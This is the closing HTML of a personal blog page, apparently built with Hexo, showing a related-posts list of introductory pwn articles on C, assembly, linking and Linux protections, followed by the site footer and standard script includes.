fa-calendar-alt fa-fw"></i> 2020-08-26</div><div class="relatedPosts_title">pwn基础--C与汇编(1)</div></div></a></div><div class="relatedPosts_item"><a href="/2020/08/26/pwn基础-C与汇编(2)/" title="pwn基础--C与汇编(2)"><img class="relatedPosts_cover" data-lazy-src="https://i.loli.net/2019/11/10/rJbFpE65tmxPv7R.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-26</div><div class="relatedPosts_title">pwn基础--C与汇编(2)</div></div></a></div><div class="relatedPosts_item"><a href="/2020/08/29/pwn基础-C与汇编(3)/" title="pwn基础-C与汇编(3)"><img class="relatedPosts_cover" data-lazy-src="https://i.loli.net/2019/11/10/egVhFWopA5mP2Hk.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-29</div><div class="relatedPosts_title">pwn基础-C与汇编(3)</div></div></a></div><div class="relatedPosts_item"><a href="/2020/08/29/pwn基础-C与链接/" title="pwn基础-C与链接"><img class="relatedPosts_cover" data-lazy-src="https://i.loli.net/2019/11/10/T7Mu8Aod3egmC4Q.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2020-08-29</div><div class="relatedPosts_title">pwn基础-C与链接</div></div></a></div><div class="relatedPosts_item"><a href="/2020/09/02/pwn入门-Linux保护机制/" title="pwn入门-Linux基础知识"><img class="relatedPosts_cover" data-lazy-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="far fa-calendar-alt fa-fw"></i> 2020-09-02</div><div class="relatedPosts_title">pwn入门-Linux基础知识</div></div></a></div></div></div></article></main><footer id="footer" data-type="color"><div id="footer-wrap"><div class="copyright">&copy;2020 By Leonlist</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></section><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js" async></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
